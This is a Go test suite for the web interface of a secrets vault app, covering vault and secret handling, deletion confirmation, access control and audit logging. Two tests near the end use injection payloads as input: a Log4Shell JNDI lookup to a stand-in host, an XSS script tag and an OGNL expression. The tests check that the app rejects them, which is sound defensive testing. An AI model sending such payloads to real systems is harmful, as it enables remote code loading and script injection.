package web

import (
	"context"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"testing"

	"synsec/internal/store"
)

func (h *harness) csrf(t *testing.T) string {
	t.Helper()
	return csrfToken(h.sessionCookieValue(t))
}

// newAnonymousClient has no cookie jar, so it carries no session.
func newAnonymousClient() *http.Client {
	return &http.Client{
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

// newVault creates a vault and gives it to the harness account.
//
// The grant is explicit because nothing implies it any more: an administrator
// no longer sees vaults nobody shared with them, so a vault created without a
// manager would be invisible to everyone - including the test that just made
// it.
func (h *harness) newVault(t *testing.T, name string) store.Project {
	t.Helper()
	ctx := context.Background()

	owner, err := h.manager.DB().UserByUsername(ctx, "cyril")
	if err != nil {
		t.Fatalf("UserByUsername: %v", err)
	}

	p, err := h.manager.CreateVault(ctx, name, "", owner.ID)
	if err != nil {
		t.Fatalf("CreateVault: %v", err)
	}
	if err := h.manager.DB().SetVaultMember(ctx, p.ID, owner.ID, store.RoleManager, "test"); err != nil {
		t.Fatalf("SetVaultMember: %v", err)
	}
	return p
}

func TestCreateVaultFromTheBrowser(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)

	resp := h.post(t, "/coffres", url.Values{
		"csrf": {h.csrf(t)},
		"name": {"Maison"},
	})
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("creating a vault returned %d", resp.StatusCode)
	}

	vaults, err := h.manager.DB().ListProjects(context.Background())
	if err != nil {
		t.Fatalf("ListProjects: %v", err)
	}
	if len(vaults) != 1 || vaults[0].Name != "Maison" {
		t.Fatalf("the vault list is %+v", vaults)
	}
	// The redirect must land on the new vault, not back on the list.
	if loc := resp.Header.Get("Location"); loc != "/coffres/"+vaults[0].ID {
		t.Fatalf("redirected to %q", loc)
	}
}

// The creation form lives at a literal path that looks like a vault
// identifier; the standard mux must prefer it over the wildcard route.
func TestNewVaultFormIsReachable(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)

	resp := h.get(t, "/coffres/nouveau")
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("the creation form returned %d", resp.StatusCode)
	}
	if page := body(t, resp); !strings.Contains(page, `action="/coffres"`) {
		t.Fatal("the creation form does not post to /coffres")
	}
}

// A destructive action must ask first. The confirmation is wired from an
// external script through this attribute, because the content security policy
// forbids inline handlers - one was silently dropped before.
func TestDeleteFormAsksForConfirmation(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	if _, err := h.manager.PutSecret(context.Background(), loc, []byte("s3cr3t"), "", "test"); err != nil {
		t.Fatalf("PutSecret: %v", err)
	}

	page := body(t, h.get(t, "/coffres/"+vault.ID))
	if !strings.Contains(page, "data-confirm=") {
		t.Fatal("the delete form carries no confirmation")
	}
	if strings.Contains(page, "onsubmit=") {
		t.Fatal("an inline handler is back; the content security policy would drop it")
	}
}

func TestSecretRoundTripFromTheBrowser(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	resp := h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf":  {h.csrf(t)},
		"name":  {"mqtt_password"},
		"value": {"s3cr3t"},
	})
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("saving a secret returned %d", resp.StatusCode)
	}

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	value, err := h.manager.GetSecret(context.Background(), loc)
	if err != nil {
		t.Fatalf("GetSecret: %v", err)
	}
	if string(value) != "s3cr3t" {
		t.Fatalf("the stored value is %q", value)
	}

	// The edit form must come back with the value in it.
	page := body(t, h.get(t, "/coffres/"+vault.ID+"/secret?name=mqtt_password"))
	if !strings.Contains(page, "s3cr3t") {
		t.Fatal("the edit form does not show the current value")
	}
}

// Listing a vault must never put a value on screen: the point of the list is
// to find your way around, not to read secrets over someone's shoulder.
func TestVaultListingHidesValues(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	if _, err := h.manager.PutSecret(context.Background(), loc, []byte("s3cr3t"), "", "test"); err != nil {
		t.Fatalf("PutSecret: %v", err)
	}

	page := body(t, h.get(t, "/coffres/"+vault.ID))
	if strings.Contains(page, "s3cr3t") {
		t.Fatal("the vault listing leaked a secret value")
	}
	if !strings.Contains(page, "mqtt_password") {
		t.Fatal("the vault listing does not show the secret path")
	}
}

// Saving over an existing secret keeps the old value in the history rather
// than overwriting it.
func TestSavingCreatesANewVersion(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	for i, value := range []string{"premier", "deuxieme"} {
		form := url.Values{
			"csrf": {h.csrf(t)}, "name": {"mqtt_password"}, "value": {value},
		}
		// The second save is an edit, and says so - the creation form does not
		// carry this field, which is how an accidental overwrite is caught.
		if i > 0 {
			form.Set("editing", "1")
		}

		resp := h.post(t, "/coffres/"+vault.ID+"/secret", form)
		if resp.StatusCode != http.StatusSeeOther {
			t.Fatalf("saving %q returned %d", value, resp.StatusCode)
		}
	}

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	current, err := h.manager.DB().SecretMeta(context.Background(), loc)
	if err != nil {
		t.Fatalf("SecretMeta: %v", err)
	}
	if current.CurrentVersion != 2 {
		t.Fatalf("the secret is at version %d, want 2", current.CurrentVersion)
	}
}

// Creating an entry whose identifier is already taken would write a new
// version of somebody else's secret without a word.
func TestCreatingOverAnExistingIdentifier(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")
	ctx := context.Background()

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "home_assistant"}
	if _, err := h.manager.PutSecret(ctx, loc, []byte("le sien"), "Home Assistant", "cyril"); err != nil {
		t.Fatalf("PutSecret: %v", err)
	}

	// Typed explicitly: refused, because renaming what someone wrote would be
	// its own kind of surprise.
	resp := h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf": {h.csrf(t)}, "label": {"Home Assistant"},
		"name": {"home_assistant"}, "value": {"le mien"},
	})
	if loc := resp.Header.Get("Location"); !strings.Contains(loc, "erreur=") {
		t.Fatalf("a colliding identifier was accepted: redirected to %q", loc)
	}
	value, err := h.manager.GetSecret(ctx, loc)
	if err != nil {
		t.Fatalf("GetSecret: %v", err)
	}
	if string(value) != "le sien" {
		t.Fatalf("the existing value was overwritten with %q", value)
	}

	// Derived from the label: nudged aside rather than refused.
	resp = h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf": {h.csrf(t)}, "label": {"Home Assistant"}, "value": {"le mien"},
	})
	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
		t.Fatalf("a derived identifier was refused: %q", loc)
	}
	second := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "home_assistant_2"}
	if got, err := h.manager.GetSecret(ctx, second); err != nil || string(got) != "le mien" {
		t.Fatalf("the second secret is %q (%v), want le mien under home_assistant_2", got, err)
	}
}

// Editing an existing secret writes over it on purpose, and must not be
// mistaken for a collision.
func TestEditingIsNotACollision(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")
	ctx := context.Background()

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "home_assistant"}
	h.manager.PutSecret(ctx, loc, []byte("premier"), "Home Assistant", "cyril")

	resp := h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf": {h.csrf(t)}, "editing": {"1"}, "label": {"HA - salon"},
		"name": {"home_assistant"}, "value": {"deuxieme"},
	})
	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
		t.Fatalf("an edit was treated as a collision: %q", loc)
	}

	value, _ := h.manager.GetSecret(ctx, loc)
	if string(value) != "deuxieme" {
		t.Fatalf("the edit did not take: %q", value)
	}
	// The label is free to change; the identifier is not.
	meta, err := h.manager.DB().SecretMeta(ctx, loc)
	if err != nil {
		t.Fatalf("SecretMeta: %v", err)
	}
	if meta.Label != "HA - salon" {
		t.Fatalf("the label is %q, want the new one", meta.Label)
	}
}

func TestDeleteSecretFromTheBrowser(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	if _, err := h.manager.PutSecret(context.Background(), loc, []byte("s3cr3t"), "", "test"); err != nil {
		t.Fatalf("PutSecret: %v", err)
	}

	resp := h.post(t, "/coffres/"+vault.ID+"/secret/supprimer", url.Values{
		"csrf": {h.csrf(t)}, "name": {"mqtt_password"},
	})
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("deleting returned %d", resp.StatusCode)
	}

	if _, err := h.manager.GetSecret(context.Background(), loc); err == nil {
		t.Fatal("the secret survived deletion")
	}
}

func TestVaultPagesRequireSignIn(t *testing.T) {
	h := newHarness(t)
	// A vault has to exist, or the test would pass for the wrong reason.
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	anonymous := newAnonymousClient()
	for _, path := range []string{
		"/coffres/" + vault.ID,
		"/coffres/" + vault.ID + "/secret?name=mqtt_password",
	} {
		resp, err := anonymous.Get(h.srv.URL + path)
		if err != nil {
			t.Fatalf("GET %s: %v", path, err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusSeeOther {
			t.Fatalf("%s returned %d to an anonymous visitor", path, resp.StatusCode)
		}
	}
}

func TestUnknownVaultIsNotFound(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)

	resp := h.get(t, "/coffres/nexistepas")
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("an unknown vault returned %d, want 404", resp.StatusCode)
	}
}

// Writes from the browser are audited like any other, and the value itself
// never reaches the log.
func TestBrowserWritesAreAudited(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf": {h.csrf(t)}, "name": {"mqtt_password"}, "value": {"s3cr3t"},
	})
	h.get(t, "/coffres/"+vault.ID+"/secret?name=mqtt_password")

	entries, err := h.manager.DB().ListAudit(context.Background(), store.AuditFilter{})
	if err != nil {
		t.Fatalf("ListAudit: %v", err)
	}

	seen := make(map[string]bool, len(entries))
	for _, e := range entries {
		seen[e.Action] = true
		if strings.Contains(e.Detail, "s3cr3t") || strings.Contains(e.Target, "s3cr3t") {
			t.Fatal("the audit log recorded a secret value")
		}
	}
	for _, action := range []string{"secret.write", "secret.read"} {
		if !seen[action] {
			t.Fatalf("%s was not recorded; log holds %v", action, seen)
		}
	}
}

func TestSecretNameValidation(t *testing.T) {
	// Nothing is silently transformed: a name quietly rewritten is a name the
	// owner will look for and not find.
	for _, bad := range []string{"", "  ", "mqtt/password", "mqtt password", "mqtt.password"} {
		if _, err := cleanSecretName(bad); err == nil {
			t.Errorf("the name %q was accepted", bad)
		}
	}

	// Surrounding whitespace is a typing slip rather than part of the name.
	got, err := cleanSecretName("  mqtt_password  ")
	if err != nil {
		t.Fatalf("cleanSecretName: %v", err)
	}
	if got != "mqtt_password" {
		t.Fatalf("got %q, want mqtt_password", got)
	}
}

// Destroying a vault takes everyone's secrets with it, so it is the owner's
// decision and not a manager's.
func TestOnlyTheOwnerDeletesAVault(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")
	alice := h.addUser(t, "alice")
	ctx := context.Background()

	if err := h.manager.DB().SetVaultMember(ctx, vault.ID, alice.ID, store.RoleManager, "cyril"); err != nil {
		t.Fatalf("SetVaultMember: %v", err)
	}

	h.signInAs(t, "alice")
	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
		"csrf": {h.csrf(t)}, "confirm": {"Maison"},
	})
	if loc := resp.Header.Get("Location"); !strings.Contains(loc, "erreur=") {
		t.Fatalf("a manager who is not the owner deleted the vault: %q", loc)
	}
	if _, err := h.manager.DB().Project(ctx, vault.ID); err != nil {
		t.Fatalf("the vault is gone: %v", err)
	}

	// The page does not even offer it to them.
	if page := body(t, h.get(t, "/coffres/"+vault.ID)); strings.Contains(page, "/supprimer") {
		t.Fatal("the delete form is shown to a manager who is not the owner")
	}
}

// The name has to be typed. A dialog is answered by reflex; this is the one
// action no later backup can undo.
func TestDeletingAVaultNeedsItsName(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")
	ctx := context.Background()

	for _, wrong := range []string{"", "maison", "Maiso", "Bureau"} {
		resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
			"csrf": {h.csrf(t)}, "confirm": {wrong},
		})
		if loc := resp.Header.Get("Location"); !strings.Contains(loc, "erreur=") {
			t.Errorf("confirmation %q was accepted: %q", wrong, loc)
		}
	}
	if _, err := h.manager.DB().Project(ctx, vault.ID); err != nil {
		t.Fatalf("the vault was deleted without confirmation: %v", err)
	}
}

// Everything hanging off the vault goes with it, so nothing is left pointing
// at a vault that no longer exists.
func TestDeletingAVaultTakesItsContents(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")
	ctx := context.Background()

	loc := store.SecretLocation{ProjectID: vault.ID, Env: store.DefaultEnvironment, Name: "mqtt_password"}
	if _, err := h.manager.PutSecret(ctx, loc, []byte("s3cr3t"), "", "cyril"); err != nil {
		t.Fatalf("PutSecret: %v", err)
	}
	h.post(t, "/coffres/"+vault.ID+"/appareils", url.Values{
		"csrf": {h.csrf(t)}, "name": {"HA"},
	})

	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
		"csrf": {h.csrf(t)}, "confirm": {"Maison"},
	})
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("deleting returned %d", resp.StatusCode)
	}

	if _, err := h.manager.DB().Project(ctx, vault.ID); err == nil {
		t.Fatal("the vault survived")
	}
	if secrets, _ := h.manager.DB().ListSecrets(ctx, vault.ID, store.DefaultEnvironment); len(secrets) != 0 {
		t.Fatalf("%d secrets survived the vault", len(secrets))
	}
	if tokens, _ := h.manager.DB().ListServiceTokens(ctx, vault.ID); len(tokens) != 0 {
		t.Fatalf("%d tokens survived the vault", len(tokens))
	}

	// The log outlives what it describes: it is the only remaining record.
	entries, err := h.manager.DB().ListAudit(ctx, store.AuditFilter{Action: "vault.delete"})
	if err != nil {
		t.Fatalf("ListAudit: %v", err)
	}
	if len(entries) != 1 || entries[0].Target != "Maison" {
		t.Fatalf("the deletion was not recorded: %v", entries)
	}
}

// A vault name is a label somebody reads. What a dynamic scan wrote into that
// field was neither readable nor, once stored, removable: deleting asked for
// the name to be retyped, and no shell repeats a payload verbatim.

func TestTheInterfaceRefusesAPayloadAsAVaultName(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)

	for _, name := range []string{
		"${jndi:ldap://mechant.example/a}",
		"<script>alert(1)</script>",
		"%{#context['x']=false}",
		strings.Repeat("a", store.MaxVaultNameLength+1),
	} {
		resp := h.post(t, "/coffres", url.Values{"csrf": {h.csrf(t)}, "name": {name}})
		loc := resp.Header.Get("Location")
		if !strings.Contains(loc, "erreur=") {
			t.Errorf("le nom %q a été accepté (%s)", name, loc)
		}
		// The refused characters must not travel back in the query string: the
		// message lands in browser history.
		if strings.Contains(loc, "jndi") || strings.Contains(loc, "script") {
			t.Errorf("le message renvoie la charge : %s", loc)
		}
	}
}

func TestTheInterfaceKeepsOrdinaryVaultNames(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)

	resp := h.post(t, "/coffres", url.Values{
		"csrf": {h.csrf(t)}, "name": {"Chez l'oncle Léon"},
		"description": {"Domotique, caméras, box internet."},
	})
	if resp.StatusCode != http.StatusSeeOther {
		t.Fatalf("un nom ordinaire a été refusé (%d)", resp.StatusCode)
	}
	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
		t.Fatalf("un nom ordinaire a été refusé : %s", loc)
	}
}

// The identifier confirms as well as the name, so a vault whose name cannot be
// retyped stays deletable by its owner.
func TestAVaultCanBeDeletedByItsIdentifier(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
		"csrf": {h.csrf(t)}, "confirm": {vault.ID},
	})
	if loc := resp.Header.Get("Location"); strings.Contains(loc, "erreur=") {
		t.Fatalf("l'identifiant n'a pas confirmé la suppression : %s", loc)
	}
	if _, err := h.manager.DB().Project(context.Background(), vault.ID); err == nil {
		t.Fatal("le coffre existe toujours")
	}
}

// And a wrong confirmation still stops it.
func TestAWrongConfirmationStillRefuses(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	resp := h.post(t, "/coffres/"+vault.ID+"/supprimer", url.Values{
		"csrf": {h.csrf(t)}, "confirm": {"maison"},
	})
	if loc := resp.Header.Get("Location"); !strings.Contains(loc, "erreur=") {
		t.Fatal("une confirmation approximative a suffi")
	}
	if _, err := h.manager.DB().Project(context.Background(), vault.ID); err != nil {
		t.Fatal("le coffre a été supprimé malgré une confirmation incorrecte")
	}
}

// The form and the server must agree. A field that lets somebody type more
// than the server will store is a refusal they only discover on submitting.
func TestEveryBoundedFieldCarriesItsBoundInTheForm(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	pages := map[string]map[string]int{
		"/coffres/nouveau":                    {"name": store.MaxVaultNameLength, "description": store.MaxVaultDescriptionLength},
		"/coffres/" + vault.ID + "/secret":    {"label": store.MaxLabelLength, "name": store.MaxSecretNameLength},
		"/coffres/" + vault.ID + "/appareils": {"name": store.MaxLabelLength},
		"/comptes":                            {"username": store.MaxUsernameLength, "display_name": store.MaxLabelLength},
	}

	for path, fields := range pages {
		page := body(t, h.get(t, path))
		for field, limit := range fields {
			// The attribute has to sit on the same tag as the field, so the
			// search starts at the field and looks just past it.
			at := strings.Index(page, `name="`+field+`"`)
			if at < 0 {
				t.Errorf("%s : champ %q introuvable", path, field)
				continue
			}
			tag := page[at:]
			if end := strings.Index(tag, ">"); end > 0 {
				tag = tag[:end]
			}
			if !strings.Contains(tag, `maxlength="`+strconv.Itoa(limit)+`"`) {
				t.Errorf("%s : le champ %q n'annonce pas maxlength=%d", path, field, limit)
			}
		}
	}
}

// And a label refused by the server says so on the form rather than failing as
// an internal error.
func TestARefusedSecretLabelIsExplained(t *testing.T) {
	h := newHarness(t)
	h.signIn(t)
	vault := h.newVault(t, "Maison")

	resp := h.post(t, "/coffres/"+vault.ID+"/secret", url.Values{
		"csrf": {h.csrf(t)}, "label": {"<script>alert(1)</script>"},
		"name": {"essai"}, "value": {"x"},
	})
	loc := resp.Header.Get("Location")
	if !strings.Contains(loc, "erreur=") {
		t.Fatalf("un libellé de charge a été accepté : %s", loc)
	}
	if strings.Contains(loc, "script") {
		t.Fatalf("le message renvoie la charge : %s", loc)
	}
}
